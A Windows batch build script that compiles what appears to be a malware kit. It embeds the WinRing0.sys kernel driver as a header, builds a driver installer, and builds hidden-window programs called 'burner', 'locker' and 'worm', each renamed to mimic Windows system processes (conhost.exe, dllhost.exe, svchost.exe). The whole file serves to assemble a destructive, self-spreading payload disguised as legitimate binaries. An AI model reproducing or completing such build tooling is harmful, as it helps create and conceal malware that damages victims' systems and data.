@echo off
setlocal
set CF=-O2 -municode -fno-exceptions -fno-rtti -static -static-libgcc -static-libstdc++

echo [*] bin2h
g++ -O2 bin2h.cpp -o bin2h.exe -static
if errorlevel 1 goto fail

echo [*] generating winring0_blob.h
bin2h.exe WinRing0.sys winring0_blob.h
if errorlevel 1 goto fail

echo [*] winring0_install
g++ %CF% winring0_install.cpp -o winring0_install.exe -ladvapi32
if errorlevel 1 goto fail

echo [*] burner
g++ %CF% -mwindows burner.cpp -o conhost.exe -luser32 -ladvapi32 -lole32
if errorlevel 1 goto fail

echo [*] locker
g++ %CF% -mwindows locker.cpp -o dllhost.exe -luser32 -lgdi32
if errorlevel 1 goto fail

echo [*] worm
g++ %CF% -mwindows worm.cpp -o svchost.exe -lnetapi32 -lws2_32 -ladvapi32 -lole32
if errorlevel 1 goto fail

echo [+] done: svchost.exe + dllhost.exe + conhost.exe + winring0_install.exe
goto :eof

:fail
echo [!] build failed
exit /b 1
